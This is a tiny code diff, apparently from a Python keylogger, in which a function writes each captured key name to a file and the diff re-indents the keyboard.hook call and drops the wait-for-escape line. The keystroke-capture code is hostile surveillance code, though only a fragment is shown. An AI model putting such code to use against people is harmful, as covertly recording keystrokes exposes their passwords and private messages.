@@ -14,6 +14,4 @@ def capture_keypress(event):
         else:
             f.write(event.name)
 
-keyboard.hook(capture_keypress,suppress=True)
-
-keyboard.wait('esc')
+    keyboard.hook(capture_keypress,suppress=True)
